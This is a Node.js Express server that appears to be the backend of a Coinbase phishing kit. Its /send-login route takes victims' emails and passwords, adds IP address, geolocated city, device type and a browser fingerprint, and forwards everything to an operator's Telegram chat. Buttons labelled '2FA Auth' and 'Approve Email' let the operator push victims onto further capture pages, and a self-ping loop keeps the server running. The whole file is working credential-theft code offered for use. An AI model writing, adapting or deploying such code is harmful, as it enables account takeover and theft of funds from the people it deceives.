const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const crypto = require("crypto");

const { bot } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🖐️ DEVICE FINGERPRINT & IP PREFIX
// ============================================================================

function getIPPrefix(ip) {
  const parts = ip.split('.');
  return `${parts[0]}.${parts[1]}`;
}

function getDeviceFingerprint(req) {
  try {
    const userAgent = req.get("user-agent") || "";
    const acceptLanguage = req.get("accept-language") || "";
    const acceptEncoding = req.get("accept-encoding") || "";
    
    const combined = `${userAgent}|${acceptLanguage}|${acceptEncoding}`;
    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
    return fingerprint;
  } catch (err) {
    return null;
  }
}

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    // Try geojs.io first
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    
    if (data.city && data.country) {
      return `${data.city}, ${data.country}`;
    }
    
    // Fallback to ip-api.com
    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
    const data2 = await response2.json();
    
    if (data2.city && data2.country) {
      return `${data2.city}, ${data2.country}`;
    }
    
    return "Unknown Region";
  } catch (error) {
    return "Unknown Region";
  }
}

// ============================================================================
// 💾 STORAGE
// ============================================================================

let userIdCounter = 1;
const userIds = {};
const pendingApprovals = {};
const deviceFingerprintToEmail = {};

// ============================================================================
// 🔔 SELF-PING
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
      console.log(`🔄 Pinged`);
    } catch (err) {
      console.error(`❌ Ping error`);
    }
  }, 30000);
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// POST /send-login
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const ipPrefix = getIPPrefix(ip);
    const fingerprint = getDeviceFingerprint(req);

    // Store fingerprint mapping
    if (fingerprint && email) {
      deviceFingerprintToEmail[fingerprint] = email;
    }

    console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);

    // Build message
    const message =
      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
          ],
          [
            { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      pendingApprovals[email] = {
        status: "pending",
        timestamp: Date.now(),
        userId,
        password,
        region,
        device,
        ip,
        fingerprint
      };

      res.json({ ok: true, message: "Login request sent for approval", email });
    } else {
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-status
// ============================================================================

app.post("/check-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "unknown" });
    }

    if (pendingApprovals[email]) {
      return res.json({
        status: pendingApprovals[email].status || "pending",
        email: email
      });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    if (!pendingApprovals[email]) {
      pendingApprovals[email] = {};
    }

    // Map status codes
    if (status === "page1") {
      pendingApprovals[email].status = "accepted1";
    } else if (status === "page2") {
      pendingApprovals[email].status = "accepted2";
    } else if (status === "reject") {
      pendingApprovals[email].status = "rejected";
    } else {
      pendingApprovals[email].status = status;
    }

    pendingApprovals[email].updatedAt = Date.now();

    res.json({ ok: true, message: "Status updated" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  startSelfPing();
});

module.exports = { app, server };
